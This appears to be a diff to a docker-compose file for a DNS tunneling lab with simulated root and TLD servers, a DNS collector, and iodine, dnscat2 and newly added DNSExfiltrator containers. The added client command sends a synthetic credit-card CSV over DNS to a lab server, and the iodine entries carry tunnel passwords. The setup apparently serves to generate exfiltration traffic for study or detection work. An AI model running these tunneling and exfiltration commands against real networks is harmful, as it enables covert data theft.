@@ -18,6 +18,8 @@ services:
       internet:
         ipv4_address: 10.1.1.1
     restart: unless-stopped
+    profiles:
+      - essential
 
   tcpreplay:
     build: ./pcap-replayer
@@ -32,6 +34,8 @@ services:
       ip link set replay0 up &&
       echo '✓ replay0 created and ready' && tail -f /dev/null"
       ]
+    profiles:
+      - essential
 
   dnscollector:
     container_name: dnscollector
@@ -46,6 +50,8 @@ services:
       - ./dns-collector/config/:/etc/dnscollector/
       - ./dns-collector/logs:/var/log/dnscollector
     restart: unless-stopped
+    profiles:
+      - essential
 
   root-simulator:
     container_name: root-simulator
@@ -61,6 +67,8 @@ services:
       internet:
         ipv4_address: 10.5.5.5
     restart: unless-stopped
+    profiles:
+      - essential
 
   tld-simulator:
     container_name: tld-simulator
@@ -78,6 +86,8 @@ services:
       server-network:
         ipv4_address: 192.168.1.1
     restart: unless-stopped
+    profiles:
+      - essential
 
   iodine-server:
     container_name: iodine-server
@@ -88,9 +98,9 @@ services:
       - NET_ADMIN
     networks:
       server-network:
-        ipv4_address: 192.168.2.2
+        ipv4_address: 192.168.3.3
     restart: no
-    entrypoint: ["iodined", "-f", "-c", "-P", "password123", "10.100.100.100", "tunnel.com"]
+    entrypoint: ["iodined", "-P", "password", "-f", "10.0.0.1", "tunnel.com"]
 
   iodine-client:
     container_name: iodine-client
@@ -105,7 +115,7 @@ services:
       client-network:
         ipv4_address: 172.16.0.10
     restart: no
-    entrypoint: ["iodine", "-f", "-r", "-P", "password123", "tunnel.com"]
+    entrypoint: ["iodine", "-f", "-L0", "-r", "-T", "A", "-O", "Base32", "-I", "5", "-M", "100", "-m", "20", "-L", "1", "-P", "password", "172.16.0.2", "tunnel.com"]
 
   dnscat2-client:
     container_name: dnscat2-client
@@ -132,7 +142,32 @@ services:
     networks:
       server-network:
         ipv4_address: 192.168.3.3
+    
 
+
+  dnsexfiltrator-client:
+    container_name: dnsexfiltrator-client
+    profiles: ["dnsexfiltrator"]
+    volumes:
+      - ./dnsexfiltrator-client/data:/data/
+    build: ./dnsexfiltrator-client
+    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_10000.csv /data/domains.txt tunframe s=172.16.0.2 l=63 t=100 e=base32 seq=LCR"]
+    networks:
+      client-network:
+        ipv4_address: 172.16.40.40
+    depends_on:
+      - dnsexfiltrator-server
+      
+  dnsexfiltrator-server:
+    container_name: dnsexfiltrator-server
+    profiles: ["dnsexfiltrator"]
+    build: ./dnsexfiltrator-server
+    volumes:
+      - ./dnsexfiltrator-server/volume/:/app/
+    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test", "-s", "LCR"]
+    networks:
+      server-network:
+        ipv4_address: 192.168.4.4
 
 networks:
   client-network:
